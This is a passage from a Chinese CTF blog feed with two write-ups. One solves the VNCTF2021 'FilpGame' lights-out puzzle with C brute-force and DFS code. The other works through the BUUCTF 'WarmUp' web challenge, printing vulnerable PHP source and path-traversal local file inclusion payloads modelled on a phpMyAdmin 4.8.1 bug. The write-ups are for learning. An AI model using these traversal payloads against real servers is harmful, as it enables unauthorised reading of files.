        <content type="html"><![CDATA[<p>就对其中感觉有意思的2个逆向题做一下记录，也是复现，当时没做出来。<a id="more"></a></p><p>其中第一个是当时算法写不来，太弱了。另外一是app使用hook更改了密钥，但是我对程序重打包后，这个hook失效了，导致一直解密出错又找不到原因。</p><h2 id="FilpGame"><a href="#FilpGame" class="headerlink" title="FilpGame"></a>FilpGame</h2><p>整个程序就一个main函数。</p><p>输入长度要小于214，对输入的每2个先进行一个int(x, 16)操作，然后进行程序的关键操作，也就是奇数位才操作：</p><p><img src="/2021/03/18/vnctf2021/image-20210421134509045.png" alt="image-20210421134509045"></p><p>在进行的关键操作开始前就要求我们输入的每2个位进行hex.decode()操作后的值是递增序列，从后面可以知道，这里实际就是规定了我们输入坐标是顺序，递增。</p><p><img src="/2021/03/18/vnctf2021/image-20210421134750425.png" alt="image-20210421134750425"></p><p>后面就是关键处理输入的地方了，程序的关键，就是位操作。</p><p><img src="/2021/03/18/vnctf2021/image-20210421190532649.png" alt="image-20210421190532649"></p><p>先熟悉一个知识点：</p><ul><li><strong>x ^ 0 = x</strong></li><li><strong>x ^ 1 = !x</strong></li></ul><p>然后其实上面的就是操作一个16*16的矩阵，只不过用了16个word型数据的每一个bit位进行存储（真是个好想法），对输入坐标和它上下左右进行bit反转，0变1，1变0。</p><p>最后程序的比较就是整个16*16的矩阵全为1，这其实是一个点灯游戏/翻转游戏，典型的算法题了，但时间要求上宽松了不少。。</p><p>太弱了，写不来，比赛时也卡在了这里，赛后发现大家有的竟然直接是找了网上现成的脚本，搜索的重要性。。</p><p>看了wp，采用爆破第一行的所有可能（2^16），接着推出第二行的情况，依次进行下去，如果最后一行都是1则满足条件。</p><p>这种想法确实可行，而且实现起来也不难，其实就是把所有可能翻的情况穷举，然后找最小解。</p><p>而这种做法如果不用搜索来做的话，<strong>有一个问题，如何穷举第一行的所有情况呢，一个好办法：因为【0-2^16-1】每个数的二进制位都不一样，且只有16位，那么每次向右移位【0-15】，如果为1就反转，这样就实现了。</strong></p><p><img src="/2021/03/18/vnctf2021/image-20210421200351125.png" alt="image-20210421200351125"></p><p>最后整体代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">min</span> = <span class="number">500</span>, cnt, flag;</span><br><span class="line"><span class="keyword">int</span> dx[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">16</span>][<span class="number">16</span>], b[<span class="number">16</span>][<span class="number">16</span>], fi;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>], tmp[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a<span class="number">-10</span>+<span class="number">65</span>:a+<span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filp</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cnt++;</span><br><span class="line">tmp[fi++] = to_hex(y), tmp[fi++] = to_hex(x);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x1 = x+dx[i];</span><br><span class="line"><span class="keyword">int</span> y1 = y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(x1 &gt;= <span class="number">0</span> &amp;&amp; x1 &lt; <span class="number">16</span> &amp;&amp; y1 &gt;=<span class="number">0</span> &amp;&amp; y1 &lt; <span class="number">16</span>)</span><br><span class="line">b[x1][y1] ^= <span class="number">1</span>;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>); i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt = <span class="number">0</span>, flag = <span class="number">0</span>, fi = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">memcpy</span>(b, a, <span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i &gt;&gt; j)&amp;<span class="number">1</span>)</span><br><span class="line">filp(<span class="number">0</span>, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[j][k] == <span class="number">0</span>)</span><br><span class="line">filp(j+<span class="number">1</span>, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b[<span class="number">15</span>][j] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt &lt; <span class="built_in">min</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, tmp, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">min</span> = cnt;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span> == <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">int</span> enc[] = &#123;<span class="number">48885</span>, <span class="number">35772</span>, <span class="number">41193</span>, <span class="number">29456</span>, <span class="number">55568</span>, <span class="number">41901</span>,</span><br><span class="line"> <span class="number">52406</span>, <span class="number">19934</span>, <span class="number">13388</span>, <span class="number">15318</span>, <span class="number">26385</span>, <span class="number">34447</span>, <span class="number">7290</span>, <span class="number">33829</span>, <span class="number">27405</span>, <span class="number">6988</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">a[i][j] = (enc[i] &gt;&gt; (<span class="number">15</span>-j)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fun() &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span></span><br></pre></td></tr></table></figure><p>得到结果，最后md5一下。</p><p>又去搜集资料，可以看这个题作为参考<a href="https://blog.csdn.net/mjj1024/article/details/80208428" target="_blank" rel="noopener">filp game</a>。然后想了很久递归的写法，思想其实还是一样，从第一行开始，一行一行的确定都是1，若达不到就回溯，直到最后一行，然后检查是否全为1。</p><p>上面说的只是加了每一行操作完后的判断，但仍然是全搜，16*16的规模还是太大了，不可行。</p><p>开始改进，使用爆破一样的思想，从第二行开始，当前一行的同列位置为0时才继续下去，否则就回溯。</p><p><img src="/2021/03/18/vnctf2021/image-20210424094440844.png" alt="image-20210424094440844"></p><p>跑了一下改进后的，跑出一组解还是很快的，但要穷举后找到目标解，仍然要很久，，主要是这样搜索多了回溯的过程，<strong>对每一行要走的位置（当前一行的同列位置为0）进行了一个所有情况搜索。</strong></p><p>这样，也没有继续在这个搜索算法上继续去改进了，继续改进不就和爆破一样了。。所以说这类问题，规模大以后，采用穷举第一行的所有情况，然后根据第一行情况依次爆破出后面的行是很好的办法了。</p><p>贴一下搜索算法（跑过规模小一些的，是可以的）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2</span>][<span class="number">5</span>]= &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;, min1 = <span class="number">999</span>, t;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a+<span class="number">55</span>:a+<span class="number">48</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">turn</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> dx = x + c[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">int</span> dy = y + c[<span class="number">1</span>][i];</span><br><span class="line">        <span class="keyword">if</span>(dx &lt; <span class="number">0</span> || dy &lt; <span class="number">0</span> || dx &gt;= <span class="number">16</span> || dy &gt;= <span class="number">16</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        Map[dx][dy] ^= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>(Map[<span class="number">15</span>][i] == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s &gt; <span class="number">107</span>)<span class="comment">//剪枝 </span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">16</span>)<span class="comment">//剪枝 </span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    <span class="keyword">if</span>(Map[x<span class="number">-1</span>][k] != <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">y = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(check())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x &gt;= <span class="number">1</span>)<span class="comment">//剪枝 </span></span><br><span class="line"><span class="keyword">if</span>(Map[x<span class="number">-1</span>][y] == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//翻转 </span></span><br><span class="line"></span><br><span class="line">ans[<span class="number">2</span>*s] = to_hex(y), ans[<span class="number">2</span>*s+<span class="number">1</span>] = to_hex(x), ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="comment">//printf("%d\n", s);</span></span><br><span class="line"></span><br><span class="line">dfs(x, y+<span class="number">1</span>, s+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//回溯 </span></span><br><span class="line">next:</span><br><span class="line">ans[<span class="number">2</span>*s] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">1</span>] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(x, y+<span class="number">1</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Map[i][j]);</span><br><span class="line">    dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(min1 &lt;= <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf("%d\n", min1);</span></span><br><span class="line">        <span class="comment">//puts(ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Impossible\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本功还是不能丢。</p><h2 id="Crackme1"><a href="#Crackme1" class="headerlink" title="Crackme1"></a>Crackme1</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web学习之刷题</title>
      <link href="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/"/>
      <url>/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>从一些web题来了解一下web相关知识。</p><a id="more"></a><h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>从注释中看到source.php，尝试访问，获取源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在源代码中又看到了hint.php，自然的又去访问看看。提示flag在ffffllllaaaagggg文件中，可怎么到达呢。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415134759029.png" alt="image-20210415134759029"></p><p>然后就是细分析源代码：</p><p>先查一下代码中出现但不熟悉的函数：</p><blockquote><p><strong>in_array(search, array, type)</strong></p><ul><li>搜索array中是否存在search字符串。如果 <em>search</em> 参数是字符串，且 <em>type</em> 参数设置为 true，则搜索区分大小写。</li></ul><p><strong>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</strong></p><ul><li>函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</li></ul><p><strong>mb_strpos (haystack , needle )</strong></p><ul><li>haystack：要被检查的字符串；needle：要搜索的字符串。查找字符串needle在字符串haystack中首次出现的位置。</li></ul></blockquote><p>之后分析源代码，先检查了输入的file参数，如果不为空，是字符串，且通过了checkFile函数检查，则将我们输入的file参数进行文件包含。从hint.php知道了flag文件名字，这里又有include，其实就可以往文件包含漏洞考虑了，将我们的flag文件包含到网页中。</p><p>从checkFile函数中分析知道，要返回True的话，我们请求的参数字符串里必须带有白名单的中的字符串[‘source.php’, ‘hint.php’]中一个，第一次是直接比较，第二次取<strong>?</strong>之前的字符串进行比较，第三次将其进行一次urldecode后再取<strong>?</strong>之前的字符串进行比较。要利用这个漏洞来包含flag文件的话，显然不是走一个判断了。</p><p>初接触web，不懂的很多，然后就是去看wp学习了。</p><p>首先看到大家的做法有2种：</p><p>1.直接走第二个判断，开始输入一个白名单中的字符串，然后拼接一个要相对路径到达flag文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>2.走第三个判断，同第一个输入，但对hint.php后的问号二次urlencode，因为浏览器获取到我们输入的参数后会自动进行一次urldecode。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%<span class="number">253</span>f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>这两种写法的区别就在于是否对问号进行urlencode。但这是为什么呢，这其实是windows与linux环境不同导致的。</p><p>这个题来自于ChaMd5安全团队2018发现的<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a>的LFI，当时发现这个漏洞的环境是windows，而这个题目的环境是linux。</p><p>在windows中，?是一个保留字符，文件名不能包含问号，如果我们的路径包含了?，这将被视为一个无效的路径，所以要利用urlencode对问号进行二次编码，避免在最后的包含路径中出现?号，而又在第三次比较时经过解码后进行比较的是问号。</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172253830.png" 